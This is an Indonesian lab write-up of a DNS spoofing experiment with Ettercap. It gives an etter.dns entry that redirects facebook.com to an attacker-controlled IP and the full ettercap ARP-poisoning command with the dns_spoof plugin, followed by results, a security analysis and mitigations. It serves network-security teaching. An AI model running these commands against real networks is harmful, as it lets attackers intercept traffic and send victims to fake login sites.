Eksperimen : DNS Spoofing Menggunakan Ettercap

Penulis: Toki • Tanggal: 9 Novemebr 2025

1. Pendahuluan

DNS Spoofing adalah teknik serangan yang memungkinkan penyerang memanipulasi hasil resolusi DNS sehingga korban diarahkan ke situs palsu. Serangan ini sering dikombinasikan dengan ARP Spoofing untuk melakukan Man-in-the-Middle attack secara efektif.

2. Tujuan Praktikum

  • Memahami konsep DNS Spoofing
  • Mengonfigurasi file DNS spoof Ettercap
  • Menguji pengalihan domain ke server palsu
  • Menganalisis risiko keamanan DNS

3. Konfigurasi DNS Spoofing

3.1 Edit File etter.dns

sudo nano /etc/ettercap/etter.dns

Tambahkan entri berikut:

www.facebook.com   A   192.168.1.50
*.facebook.com     A   192.168.1.50

Catatan: Gantilah IP dengan alamat server palsu yang disiapkan oleh penyerang.

4. Menjalankan DNS Spoofing

sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof
  • -T : Text mode
  • -M arp : ARP poisoning (MITM)
  • -P dns_spoof : Plugin DNS spoofing

5. Hasil Pengujian

Saat korban mengakses www.facebook.com, browser korban diarahkan ke alamat IP palsu yang telah ditentukan oleh penyerang.

  • Resolusi DNS berhasil dimanipulasi
  • Korban tidak menyadari pengalihan
  • Lalu lintas dapat dianalisis lebih lanjut

6. Analisis Keamanan

DNS Spoofing menunjukkan lemahnya sistem DNS tanpa enkripsi atau validasi. Tanpa DNSSEC atau HTTPS enforcement, pengguna sangat rentan terhadap pengalihan situs palsu.

7. Mitigasi

  • Menggunakan DNSSEC
  • Mengaktifkan HTTPS & HSTS
  • Menggunakan VPN
  • Implementasi IDS/IPS

8. Kesimpulan

Praktikum ini membuktikan bahwa DNS Spoofing dapat dilakukan dengan mudah ketika penyerang telah berada di posisi MITM. Kesadaran terhadap keamanan DNS menjadi faktor penting dalam melindungi pengguna jaringan.
